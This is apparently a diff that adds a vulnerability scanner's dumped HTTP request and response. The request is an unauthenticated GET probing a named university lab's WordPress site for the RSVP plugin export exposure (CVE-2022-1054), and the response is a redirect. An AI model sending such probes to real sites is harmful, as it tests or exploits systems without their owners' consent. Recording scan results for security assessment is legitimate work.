@@ -1,0 +1,26 @@
+[CVE-2022-1054] Dumped HTTP request for https://lecao-lab.science.unimelb.edu.au/wp-admin/admin.php?page=rsvp-admin-export
+
+
+GET /wp-admin/admin.php?page=rsvp-admin-export HTTP/1.1
+Host: lecao-lab.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2022-1054] Dumped HTTP response https://lecao-lab.science.unimelb.edu.au/wp-admin/admin.php?page=rsvp-admin-export
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:18:03 GMT
+Location: https://blogs.unimelb.edu.au/lecao-lab/wp-admin/admin.php?page=rsvp-admin-export/
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Special url
+
+Redirecting...
